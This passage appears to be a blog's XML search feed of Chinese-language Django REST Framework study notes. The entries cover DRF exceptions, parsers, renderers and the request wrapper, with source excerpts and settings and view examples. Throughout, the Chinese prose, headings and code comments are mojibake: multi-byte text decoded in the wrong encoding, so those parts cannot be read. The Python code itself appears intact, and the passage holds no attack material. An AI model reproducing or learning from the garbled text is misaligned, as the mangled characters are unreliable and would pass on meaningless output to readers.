href="">no5_drf_exception</a></p><p>ÂÖ∂‰∏≠ÂåÖÂê´Ôºö</p><ul><li>djangoÈ°πÁõÆ<ul><li>ÂÖ®Â±ÄÂÆöÂà∂ÂºÇÂ∏∏</li><li>Â±ÄÈÉ®ÂÆöÂà∂ÂºÇÂ∏∏</li></ul></li><li>postmanÊµãËØïÊï∞ÊçÆÂåÖ<ul><li>ÂÖ®Â±ÄÂÆöÂà∂ÂºÇÂ∏∏ÊµãËØï</li><li>Â±ÄÈÉ®ÂÆöÂà∂ÂºÇÂ∏∏ÊµãËØï</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂõõÔºâÔºöËß£ÊûêÊ®°Âùó parsers</title>
      <link href="/tech/drf-learning-notes-4-the-parsers-module/"/>
      <url>/tech/drf-learning-notes-4-the-parsers-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (4): the parsers module</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†ÅÔºö<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/parsers.py" target="_blank" rel="noopener"><code>rest_framework.parsers</code></a></li><li>ÂÆòÊñπÊñáÊ°£Ôºö<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGFyc2Vycy8=">API Guide - Parsers<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzRfZHJmX3BhcnNlcg==">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="ÂäüËÉΩ">ÂäüËÉΩ</h1><ol type="1"><li>drfÁªôÊàë‰ª¨Êèê‰æõ‰∫ÜÂ§öÁßçËß£ÊûêÊï∞ÊçÆÂåÖÊñπÂºèÁöÑËß£ÊûêÁ±ª<ul><li>form-data</li><li>x-www-form-urlencoded</li><li>json</li></ul></li><li>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÈÖçÁΩÆÊù•ÊéßÂà∂ÂâçÂè∞Êèê‰∫§ÁöÑÂì™‰∫õÊ†ºÂºèÁöÑÊï∞ÊçÆÂêéÂè∞Âú®Ëß£ÊûêÔºåÂì™‰∫õÊï∞ÊçÆ‰∏çËß£Êûê</li><li>ÂÖ®Â±ÄÈÖçÁΩÆÂ∞±ÊòØÈíàÂØπÊØè‰∏Ä‰∏™ËßÜÂõæÁ±ªÔºåÂ±ÄÈÉ®ÈÖçÁΩÆÂ∞±ÊòØÈíàÂØπÊåáÂÆöÁöÑËßÜÂõæÊù•ÔºåËÆ©ÂÆÉ‰ª¨ÂèØ‰ª•ÊåâÁÖßÈÖçÁΩÆËßÑÂàôÈÄâÊã©ÊÄßËß£ÊûêÊï∞ÊçÆ</li></ol><h1 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># APIViewÁ±ªÁöÑdispatchÊñπÊ≥ï‰∏≠</span></span><br><span class="line">request = self.initialize_request(request, *args, **kwargs)  <span class="comment"># ÁÇπËøõÂéª</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ÂáÜÂ§áË¶ÅËß£ÊûêÁöÑÊï∞ÊçÆ</span></span><br><span class="line">parser_context=self.get_parser_context(request)   <span class="comment"># ‰∏çÊòØÈáçÁÇπ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ëß£ÊûêÊ®°ÂùóÔºåËé∑ÂèñËß£ÊûêÁ±ª</span></span><br><span class="line">parsers=self.get_parsers()  <span class="comment"># ÁÇπËøõÂéª</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ÂéªÁ±ªÂ±ûÊÄß(Â±ÄÈÉ®ÈÖçÁΩÆ) Êàñ ÈÖçÁΩÆÊñá‰ª∂(ÂÖ®Â±ÄÈÖçÁΩÆ) Êãø parser_classes</span></span><br><span class="line"><span class="keyword">return</span> [parser() <span class="keyword">for</span> parser <span class="keyword">in</span> self.parser_classes]</span><br><span class="line"></span><br><span class="line"><span class="comment"># self.parser_classes‰∏∫APIViewÁ±ªÂ±ûÊÄß</span></span><br><span class="line">parser_classes = api_settings.DEFAULT_PARSER_CLASSES</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings‰∏≠ÁöÑËß£ÊûêÁ±ª</span></span><br><span class="line"><span class="string">'DEFAULT_PARSER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.parsers.JSONParser'</span>,       <span class="comment"># jsonÊï∞ÊçÆÂåÖ</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.FormParser'</span>,       <span class="comment"># x-www-form-urlencodedÊï∞ÊçÆÂåÖ  </span></span><br><span class="line">        <span class="string">'rest_framework.parsers.MultiPartParser'</span>,  <span class="comment"># form-dataÊï∞ÊçÆÂåÖ</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure><h1 id="Áî®Ê≥ïÁ§∫‰æã">Áî®Ê≥ïÁ§∫‰æã</h1><h2 id="Ëá™ÂÆö‰πâÂÖ®Â±ÄÈÖçÁΩÆ">Ëá™ÂÆö‰πâÂÖ®Â±ÄÈÖçÁΩÆ</h2><p>ÊâÄÊúâËßÜÂõæÁ±ªÁªü‰∏ÄÂ§ÑÁêÜÔºåÂú®È°πÁõÆÁöÑ<code>settings.py</code>‰∏≠</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># ÂÖ®Â±ÄËß£ÊûêÁ±ªÈÖçÁΩÆ</span></span><br><span class="line">    <span class="string">'DEFAULT_PARSER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.parsers.JSONParser'</span>,       <span class="comment"># jsonÊï∞ÊçÆÂåÖ</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.FormParser'</span>,       <span class="comment"># x-www-form-urlencodedÊï∞ÊçÆÂåÖ</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.MultiPartParser'</span>,  <span class="comment"># form-dataÊï∞ÊçÆÂåÖ</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ëá™ÂÆö‰πâÂ±ÄÈÉ®ÈÖçÁΩÆ">Ëá™ÂÆö‰πâÂ±ÄÈÉ®ÈÖçÁΩÆ</h2><p>Êüê‰∏Ä‰∏™Êàñ‰∏Ä‰∫õËßÜÂõæÁ±ªÂçïÁã¨Â§ÑÁêÜÔºåÂú®<code>views.py</code>ËßÜÂõæÁ±ª‰∏≠Êèê‰æõÂØπÂ∫îÁöÑÁ±ªÂ±ûÊÄß</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.parsers <span class="keyword">import</span> JSONParser</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># Â±ÄÈÉ®Ëß£ÊûêÁ±ªÈÖçÁΩÆÔºåÂè™Ë¶ÅjsonÁ±ªÂûãÁöÑÊï∞ÊçÆÂåÖÊâçËÉΩË¢´Ëß£Êûê</span></span><br><span class="line">    parser_classes = [JSONParser]</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="ÊµãËØïdemo">ÊµãËØïdemo</h2><p>ÊµãËØï‰ª£Á†ÅÂú®ËøôÈáåÔºö<a href="">no4_drf_parser</a></p><p>ÂÖ∂‰∏≠ÂåÖÂê´Ôºö - djangoÈ°πÁõÆ - postmanÊµãËØïÊï∞ÊçÆÂåÖÔºöBodyÊ†áÁ≠æÈ°µÂÆö‰πâ‰∫Ü3ÁßçÊ†ºÂºèÁöÑÊï∞ÊçÆ„ÄÇÂú®Â±ÄÈÉ®ËÆæÁΩÆÂè™ËÉΩÊüê‰∏ÄÁßçÊàñ‰∏§ÁßçÔºåÂàôÂú®postmanÂÖ∂‰ªñÊ†ºÂºè‰º†ÈÄíÁöÑÊï∞ÊçÆÈÉΩ‰∏çÊòæÁ§∫„ÄÇ - json - x-www-form-urlencoded - form-data</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞Ôºà‰∏âÔºâÔºöÊ∏≤ÊüìÊ®°Âùó renders</title>
      <link href="/tech/drf-learning-notes-3-the-renders-module/"/>
      <url>/tech/drf-learning-notes-3-the-renders-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (3): the renders module</strong></em></li><li>Author: dog2</li></ul><hr /><p>Áî®DRFÂÅöÊµãËØï‰ºöÂèëÁé∞ÔºåÁî®ÊµèËßàÂô®ËØ∑Ê±ÇAPIËøîÂõûDRFÂÆöÂà∂ÁöÑÈ°µÈù¢ÔºåÂØπÂºÄÂèëËÄÖÁõ∏ÂΩìÂèãÂ•ΩÔºåÂ¶Ç‰∏ãÂõæÔºö</p><p><img src="https://www.django-rest-framework.org/img/quickstart.png" /></p><p>ËÄåËã•‰ΩøÁî®pythonÁ¨¨‰∏âÊñπÊ®°ÂùórequestsÊàñËÄÖpostmanÁ≠âÂ∑•ÂÖ∑ÔºåËøôÂàôËøîÂõûÁöÑÊòØÂéüÁîüÁöÑjsonÊï∞ÊçÆ„ÄÇ</p><p>ÂÆûÁé∞ËøôÁßçÂ∑ÆÂà´ÂìçÂ∫îÁöÑÔºåÊ≠£ÊòØÊú¨ËäÇÁöÑ‰∏ªËßí‚Äî‚Äî(ÂìçÂ∫î)Ê∏≤ÊüìÊ®°Âùó„ÄÇ</p><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†ÅÔºö<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/renders.py" target="_blank" rel="noopener"><code>rest_framework.renders</code></a><ul><li><code>rest_framework.request.Request</code>Ôºö‰∏ªË¶ÅÁ±ª</li></ul></li><li>ÂÆòÊñπÊñáÊ°£Ôºö<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVuZGVyZXJzLw==">API Guide - Renderers<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Âú®`APIView`Á±ªÁöÑ`dispatch`ÊñπÊ≥ï‰∏≠ÔºåÊúÄÂêéËß£ÊûêreponseÂØπË±°Êï∞ÊçÆ</span></span><br><span class="line">self.response = self.finalize_response(request, response, *args, **kwargs) <span class="comment">#ÁÇπËøõÂéª</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ÊãøÂà∞ËøêË°åÁöÑËß£ÊûêÁ±ªÁöÑÂØπË±°‰ª¨</span></span><br><span class="line">neg = self.perform_content_negotiation(request, force=<span class="literal">True</span>)   <span class="comment">#ÁÇπËøõÂéª</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ëé∑ÂæóËß£ÊûêÁ±ªÂØπË±°</span></span><br><span class="line">renderers = self.get_renderers()   <span class="comment">#ÁÇπËøõÂéª</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ‰ªéËßÜÂõæÁ±ª‰∏≠ÂæóÂà∞renderer_classesËØ∑Ê±ÇÁ±ªÔºåÂ¶Ç‰ΩïÂÆû‰æãÂåñ‰∏Ä‰∏™‰∏™ÂØπË±°ÂΩ¢ÂèÇËß£ÊûêÁ±ªÂØπË±°ÂàóË°®</span></span><br><span class="line"><span class="keyword">return</span> [renderer() <span class="keyword">for</span> renderer <span class="keyword">in</span> self.renderer_classes]  <span class="comment">#ÈÖçÁΩÆÊñá‰ª∂</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># self.renderer_classes‰∏∫APIViewÁ±ªÂ±ûÊÄß</span></span><br><span class="line">renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings‰∏≠ÁöÑÈªòËÆ§Ê∏≤ÊüìÁ±ª</span></span><br><span class="line"><span class="string">'DEFAULT_RENDERER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.renderers.JSONRenderer'</span>,</span><br><span class="line">        <span class="string">'rest_framework.renderers.BrowsableAPIRenderer'</span>,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><h1 id="ÊÄªÁªì">ÊÄªÁªì</h1><p>Ë∞ÉÁî®ÈìæÂ¶Ç‰∏ãÔºö</p><ol type="1"><li>Ëá™Â∑±ËßÜÂõæÁ±ªÁöÑÁ±ªÂ±ûÊÄß(Â±ÄÈÉ®ÈÖçÁΩÆ)</li><li><code>APIView</code>Á±ªÁöÑÁ±ªÂ±ûÊÄßËÆæÁΩÆ</li><li>Ëá™Â∑±ÈÖçÁΩÆÊñá‰ª∂ÁöÑ<code>DEFAULT_RENDERER_CLASSES</code>(ÂÖ®Â±ÄÈÖçÁΩÆ)</li><li>drfÈÖçÁΩÆÊñá‰ª∂ÁöÑ<code>DEFAULT_RENDERER_CLASSES</code></li></ol><h1 id="Áî®Ê≥ïÁ§∫‰æã">Áî®Ê≥ïÁ§∫‰æã</h1><h2 id="Ëá™ÂÆö‰πâÂÖ®Â±ÄÈÖçÁΩÆ">Ëá™ÂÆö‰πâÂÖ®Â±ÄÈÖçÁΩÆ</h2><p>ÊâÄÊúâËßÜÂõæÁ±ªÁªü‰∏ÄÂ§ÑÁêÜÔºåÂú®È°πÁõÆÁöÑ<code>settings.py</code>‰∏≠</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># drfÊèê‰æõÁöÑÊ∏≤ÊüìÁ±ª</span></span><br><span class="line">    <span class="string">'DEFAULT_RENDERER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.renderers.JSONRenderer'</span>,       <span class="comment">#Âè™ÊòæÁ§∫Âá∫jsonÊï∞ÊçÆ</span></span><br><span class="line">      <span class="string">'rest_framework.renderers.BrowsableAPIRenderer'</span>,    <span class="comment">#Ê∏≤ÊüìÂá∫È°µÈù¢ÔºåÊ≥®ÊÑèÊòØBrowsableAPIRenderer</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ëá™ÂÆö‰πâÂ±ÄÈÉ®ÈÖçÁΩÆ">Ëá™ÂÆö‰πâÂ±ÄÈÉ®ÈÖçÁΩÆ</h2><p>Êüê‰∏Ä‰∏™Êàñ‰∏Ä‰∫õÂÆû‰ΩìÁ±ªÂçïÁã¨Â§ÑÁêÜÔºåÂú®<code>views.py</code>ËßÜÂõæÁ±ª‰∏≠Êèê‰æõÂØπÂ∫îÁöÑÁ±ªÂ±ûÊÄß</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Âú®setting.py‰∏≠ÈÖçÁΩÆREST_FRAMEWORKÔºåÂÆåÊàêÁöÑÊòØÂÖ®Â±ÄÈÖçÁΩÆÔºåÊâÄÊúâÊé•Âè£Áªü‰∏ÄÂ§ÑÁêÜ</span></span><br><span class="line"><span class="comment"># Â¶ÇÊûúÂè™ÊúâÈÉ®ÂàÜÊé•Âè£ÁâπÊÆäÂåñÔºåÂèØ‰ª•ÂÆåÊàê - Â±ÄÈÉ®ÈÖçÁΩÆ</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.renderers <span class="keyword">import</span> JSONRenderer</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># Â±ÄÈÉ®ÈÖçÁΩÆ</span></span><br><span class="line">    renderer_classes = [JSONRenderer]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf get ok 2'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf post ok 2'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞Ôºà‰∫åÔºâÔºöËØ∑Ê±ÇÊ®°Âùó request</title>
      <link href="/tech/drf-learning-notes-2-the-request-module/"/>
      <url>/tech/drf-learning-notes-2-the-request-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (2): the request module</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="drfËØ∑Ê±ÇÁîüÂëΩÂë®ÊúüÊµÅÁ®ã">DRFËØ∑Ê±ÇÁîüÂëΩÂë®ÊúüÊµÅÁ®ã</h1><ol type="1"><li>Ê†πÊçÆÂ∫îÁî®‰∏≠<code>urls.py</code>ÔºåËµ∞<code>as_view</code>ÊñπÊ≥ïÔºå‰ΩÜÊòØËßÜÂõæÁ±ªÊ≤°ÊúâËØ•ÊñπÊ≥ïÔºåÊâÄ‰ª•ËØ∑Ê±ÇËµ∞ÁöÑÊòØ<code>APIView</code>ÁöÑ<code>as_view</code>ÊñπÊ≥ï</li><li>Âú®<code>APIView</code>ÁöÑ<code>as_view</code>Ë∞ÉÁî®Áà∂Á±ª(djangoÂéüÁîüView)ÁöÑ<code>as_view</code>ÔºåÂêåÊó∂ËøòÁ¶ÅÁî®‰∫Ü csrf ËÆ§ËØÅ</li><li>Âú®Áà∂Á±ªÔºàdjangoÂéüÁîüViewÔºâÁöÑ<code>as_view</code>‰∏≠<code>dispatch</code>ÊñπÊ≥ïËØ∑Ê±ÇËµ∞ÁöÑÂèàÊòØ<code>APIView</code>ÁöÑ<code>dispatch</code><ul><li>Âõ†‰∏∫<code>APIView</code>‰πüÂèØ‰ª•Ëµ∞<code>dispatch</code>ÔºåËßÜÂõæÁ±ªÊòØÂÖàÁªßÊâø<code>APIView</code>Ôºå<code>APIView</code>‰∏≠Ê≤°ÊúâÂÜçÂéªÂéüÁîü<code>View</code>‰∏≠</li></ul></li><li>ÂÆåÊàê‰ªªÂä°ÊñπÊ≥ï‰∫§ÁªôËßÜÂõæÁ±ªÁöÑËØ∑Ê±ÇÂáΩÊï∞Â§ÑÁêÜÔºåÂæóÂà∞ËØ∑Ê±ÇÁöÑÂìçÂ∫îÁªìÊûúÔºåËøîÂõûÁªôÂâçÂè∞</li></ol><p>Âõ†Ê≠§Áõ¥Êé•‰ªéAPIViewÁöÑdispatchÂÖ•Âè£ÁúãÊ∫êÁ†Å„ÄÇ</p><h1 id="ËØ∑Ê±ÇÊ®°Âùó">ËØ∑Ê±ÇÊ®°Âùó</h1><h2 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h2><ul><li>Ê∫êÁ†ÅÔºö<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/request.py" target="_blank" rel="noopener"><code>rest_framework.request</code></a><ul><li><code>rest_framework.request.Request</code>Ôºö‰∏ªË¶ÅÁ±ª</li></ul></li><li>ÂÆòÊñπÊñáÊ°£Ôºö<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVxdWVzdHMv">API Guide - Requests<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h2 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Âú®`APIView`Á±ªÁöÑ`dispatch`ÊñπÊ≥ï‰∏≠Ôºå‰∫åÊ¨°Â∞ÅË£Örequest (ËØ∑Ê±ÇÊ®°Âùó)</span></span><br><span class="line">request = self.initialize_request(request, *args, **kwargs)   <span class="comment">#ÁÇπËøõÂéª</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ÁÇπÂáªÊü•ÁúãRequestÊ∫êÁ†Å</span></span><br><span class="line"><span class="keyword">return</span> Request(</span><br><span class="line">„ÄÄ„ÄÄrequest,</span><br><span class="line">„ÄÄ„ÄÄ...</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Âú®rest_framework.request.RequestÂÆû‰æãÂåñÊñπÊ≥ï‰∏≠</span></span><br><span class="line">self._request = request         <span class="comment">#Â∞ÜÂéüÁîürequest‰Ωú‰∏∫drf requestÁöÑ_requestÂ±ûÊÄß</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Âú®rest_framework.request.RequestÁöÑ__getattr__ÊñπÊ≥ï‰∏≠</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">return</span> getattr(self._request, attr)  <span class="comment"># ËÆøÈóÆÂ±ûÊÄßÂÆåÂÖ®ÂÖºÂÆπÂéüÁîürequest</span></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="keyword">return</span> self.__getattribute__(attr)</span><br></pre></td></tr></table></figure><h2 id="ÊÄªÁªì">ÊÄªÁªì</h2><ol type="1"><li>drf ÂØπÂéüÁîü<code>request</code>ÂÅö‰∫Ü‰∫åÊ¨°Â∞ÅË£ÖÔºåËÆæÁΩÆ<code>request._request</code>Á≠â‰∫éÂéüÁîü<code>request</code></li><li>ÂéüÁîü<code>request</code>ÂØπË±°ÁöÑÂ±ûÊÄßÂíåÊñπÊ≥ïÈÉΩÂèØ‰ª•Ë¢´drfÁöÑ<code>request</code>ÂØπË±°Áõ¥Êé•ËÆøÈóÆ(ÂÖºÂÆπ)</li><li>drfËØ∑Ê±ÇÁöÑÊâÄÊúâurlÊãºÊé•ÂèÇÊï∞ÂùáË¢´Ëß£ÊûêÂà∞<code>query_params</code>‰∏≠ÔºåÊâÄÊúâÊï∞ÊçÆÂåÖÊï∞ÊçÆÈÉΩË¢´<code>parser</code>Ëß£ÊûêÂà∞<code>data</code>‰∏≠<ul><li>getËØ∑Ê±ÇÔºöurl‰∏≠ÊãºÊé•ÁöÑÂèÇÊï∞ÈÄöËøá<code>request.query_params</code>Ëé∑Âèñ</li><li>postËØ∑Ê±ÇÔºöÊâÄÊúâËØ∑Ê±ÇÊñπÂºèÊâÄÊê∫Â∏¶ÁöÑÊï∞ÊçÆÂåÖÈÉΩÊòØÈÄöËøá<code>request.data</code>Ëé∑Âèñ</li></ul></li></ol><h2 id="Áî®Ê≥ïÁ§∫‰æã">Áî®Ê≥ïÁ§∫‰æã</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># urlÊãºÊé•ÁöÑÂèÇÊï∞</span></span><br><span class="line">        print(request._request.GET)  <span class="comment"># ‰∫åÊ¨°Â∞ÅË£ÖÊñπÂºè</span></span><br><span class="line">        print(request.GET) <span class="comment"># ÂÖºÂÆπ</span></span><br><span class="line">        print(request.query_params) <span class="comment"># ÊãìÂ±ï</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf get ok'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># ÊâÄÊúâËØ∑Ê±ÇÊñπÂºèÊê∫Â∏¶ÁöÑÊï∞ÊçÆÂåÖ</span></span><br><span class="line">        print(request._request.POST)  <span class="comment"># ‰∫åÊ¨°Â∞ÅË£ÖÊñπÂºè</span></span><br><span class="line">        print(request.POST)  <span class="comment"># ÂÖºÂÆπ</span></span><br><span class="line">        print(request.data)  <span class="comment"># ÊãìÂ±ïÔºåÂÖºÂÆπÊÄßÊúÄÂº∫Ôºå‰∏âÁßç‰º†ÂèÇÊñπÂºèÈÉΩÂèØ‰ª•Ôºöform-data,urlencoding,json</span></span><br><span class="line"></span><br><span class="line">        print(request.query_params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf post ok'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞Ôºà‰∏ÄÔºâÔºöRESTful API ÂàùÊé¢</title>
      <link href="/tech/drf-learning-notes-1-hello-restful-api/"/>
      <url>/tech/drf-learning-notes-1-hello-restful-api/</url>
      
